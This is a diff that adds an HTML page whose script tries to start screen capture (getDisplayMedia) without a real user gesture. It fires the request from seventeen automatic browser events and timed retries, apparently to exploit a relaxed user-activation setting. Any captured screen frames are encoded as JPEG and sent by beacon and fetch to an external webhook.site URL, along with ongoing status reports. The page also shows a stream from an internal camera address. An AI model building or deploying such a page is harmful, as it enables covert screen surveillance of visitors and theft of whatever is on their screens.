@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head><title>C</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/8e088608-d4df-4785-98fc-1ebd4bbefafd';
+function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+rpt('START','sec='+window.isSecureContext+'|md='+(typeof navigator.mediaDevices));
+
+var gdmDone=false;
+
+function tryGDM(label){
+    if(gdmDone)return;
+    rpt('TRY',label+'|act='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GDM_OK',label+'|tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e){
+        rpt('GDM_E',label+'|'+e.name+':'+e.message.substring(0,100));
+    });
+}
+
+// === KEY APPROACH: Call getDisplayMedia INSIDE event handlers ===
+// Theory: With dom.input_events.security.minNumTicks=0, ALL events
+// provide user activation (the InputEventSecurity mitigation is bypassed)
+
+// 1. MJPEG image onload - fires for every frame (real browser event)
+var cam=document.createElement('img');
+cam.style.cssText='width:640px;height:480px;display:block';
+cam.onload=function(){
+    rpt('IMG_LOAD','fired|act='+navigator.userActivation.isActive);
+    tryGDM('img_load');
+};
+cam.onerror=function(){
+    rpt('IMG_ERR','fired|act='+navigator.userActivation.isActive);
+    tryGDM('img_error');
+};
+cam.src='http://10.133.7.5/stream';
+document.body.appendChild(cam);
+
+// 2. Window load event
+window.addEventListener('load',function(){
+    rpt('WIN_LOAD','fired|act='+navigator.userActivation.isActive);
+    tryGDM('win_load');
+});
+
+// 3. DOMContentLoaded
+document.addEventListener('DOMContentLoaded',function(){
+    rpt('DCL','fired|act='+navigator.userActivation.isActive);
+    tryGDM('dcl');
+});
+
+// 4. Focus events
+window.addEventListener('focus',function(){
+    rpt('FOCUS','fired|act='+navigator.userActivation.isActive);
+    tryGDM('focus');
+});
+
+// 5. Visibility change
+document.addEventListener('visibilitychange',function(){
+    rpt('VIS','state='+document.visibilityState+'|act='+navigator.userActivation.isActive);
+    tryGDM('vis');
+});
+
+// 6. pageshow event
+window.addEventListener('pageshow',function(e){
+    rpt('PAGESHOW','persisted='+e.persisted+'|act='+navigator.userActivation.isActive);
+    tryGDM('pageshow');
+});
+
+// 7. hashchange - trigger via hash change
+window.addEventListener('hashchange',function(){
+    rpt('HASH','fired|act='+navigator.userActivation.isActive);
+    tryGDM('hash');
+});
+setTimeout(function(){window.location.hash='#trigger'},2000);
+
+// 8. message event (postMessage to self)
+window.addEventListener('message',function(e){
+    if(e.data==='gdm'){
+        rpt('MSG','fired|act='+navigator.userActivation.isActive);
+        tryGDM('msg');
+    }
+});
+setTimeout(function(){window.postMessage('gdm','*')},1000);
+
+// 9. storage event
+window.addEventListener('storage',function(){
+    rpt('STORAGE','fired|act='+navigator.userActivation.isActive);
+    tryGDM('storage');
+});
+
+// 10. animationend event
+setTimeout(function(){
+    if(gdmDone)return;
+    var el=document.createElement('div');
+    el.style.cssText='position:fixed;top:0;left:0;width:10px;height:10px;background:red;animation:a 0.1s';
+    var style=document.createElement('style');
+    style.textContent='@keyframes a{from{opacity:1}to{opacity:0}}';
+    document.head.appendChild(style);
+    el.addEventListener('animationend',function(){
+        rpt('ANIM','fired|act='+navigator.userActivation.isActive);
+        tryGDM('anim');
+    });
+    document.body.appendChild(el);
+},3000);
+
+// 11. transitionend event
+setTimeout(function(){
+    if(gdmDone)return;
+    var el=document.createElement('div');
+    el.style.cssText='position:fixed;top:0;left:0;width:10px;height:10px;background:blue;transition:opacity 0.1s';
+    document.body.appendChild(el);
+    el.addEventListener('transitionend',function(){
+        rpt('TRANS','fired|act='+navigator.userActivation.isActive);
+        tryGDM('trans');
+    });
+    requestAnimationFrame(function(){el.style.opacity='0'});
+},3500);
+
+// 12. MutationObserver callback
+setTimeout(function(){
+    if(gdmDone)return;
+    var obs=new MutationObserver(function(){
+        rpt('MUTATE','fired|act='+navigator.userActivation.isActive);
+        tryGDM('mutate');
+        obs.disconnect();
+    });
+    obs.observe(document.body,{childList:true});
+    document.body.appendChild(document.createElement('span'));
+},4000);
+
+// 13. IntersectionObserver callback
+setTimeout(function(){
+    if(gdmDone)return;
+    var el=document.createElement('div');
+    el.style.cssText='width:10px;height:10px;background:green';
+    var obs=new IntersectionObserver(function(entries){
+        rpt('INTERSECT','fired|act='+navigator.userActivation.isActive);
+        tryGDM('intersect');
+        obs.disconnect();
+    });
+    document.body.appendChild(el);
+    obs.observe(el);
+},4500);
+
+// 14. requestAnimationFrame callback
+requestAnimationFrame(function(){
+    rpt('RAF','fired|act='+navigator.userActivation.isActive);
+    tryGDM('raf');
+});
+
+// 15. ResizeObserver callback
+setTimeout(function(){
+    if(gdmDone)return;
+    var el=document.createElement('div');
+    el.style.cssText='width:100px;height:100px;background:yellow';
+    document.body.appendChild(el);
+    var obs=new ResizeObserver(function(){
+        rpt('RESIZE','fired|act='+navigator.userActivation.isActive);
+        tryGDM('resize');
+        obs.disconnect();
+    });
+    obs.observe(el);
+    el.style.width='200px';
+},5000);
+
+// 16. PerformanceObserver
+setTimeout(function(){
+    if(gdmDone)return;
+    try{
+        var obs=new PerformanceObserver(function(list){
+            rpt('PERF','fired|act='+navigator.userActivation.isActive);
+            tryGDM('perf');
+            obs.disconnect();
+        });
+        obs.observe({entryTypes:['resource']});
+        // Trigger a resource load
+        var s=document.createElement('link');
+        s.rel='icon';s.href='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+        document.head.appendChild(s);
+    }catch(e){}
+},5500);
+
+// 17. Also try GDM in retries (in case activation lingers)
+var rN=0;
+function retryGDM(){
+    rN++;if(gdmDone||rN>20)return;
+    if(rN<=3||rN%5==0){
+        tryGDM('retry'+rN);
+    }else{
+        navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+            if(gdmDone)return;gdmDone=true;
+            rpt('GDM_OK','retry'+rN);
+            processStream(s);
+        }).catch(function(){});
+    }
+    setTimeout(retryGDM,3000);
+}
+setTimeout(retryGDM,500);
+
+function processStream(stream){
+    rpt('STREAM','tracks='+stream.getTracks().length);
+    stream.getTracks().forEach(function(t,i){
+        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+    });
+    var v=document.createElement('video');
+    v.srcObject=stream;v.autoplay=true;v.muted=true;
+    v.style.cssText='width:800px;height:600px;display:block';
+    document.body.appendChild(v);
+    v.onloadeddata=function(){
+        rpt('VID',v.videoWidth+'x'+v.videoHeight);
+        doGrab(v,stream,'ld0');
+        setTimeout(function(){doGrab(v,stream,'ld1')},1000);
+        setTimeout(function(){doGrab(v,stream,'ld3')},3000);
+    };
+    setTimeout(function(){doGrab(v,stream,'t1')},500);
+    setTimeout(function(){doGrab(v,stream,'t3')},3000);
+    setTimeout(function(){doGrab(v,stream,'t10')},10000);
+}
+
+var grabN=0;
+function doGrab(v,stream,label){
+    grabN++;if(grabN>8)return;
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
+    try{
+        var d=ctx.getImageData(0,0,20,1);
+        var px=Array.from(d.data);
+        var nz=px.filter(function(x){return x>0}).length;
+        rpt('PX',label+'|nz='+nz+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',label+'|'+e.message)}
+    try{
+        var du=c.toDataURL('image/jpeg',0.7);
+        rpt('DU',label+'|len='+du.length);
+        if(du.length>1000){
+            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
+            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
+        }
+    }catch(e){rpt('DU_E',label+'|'+e.message)}
+}
+</script>
+</body>
+</html>
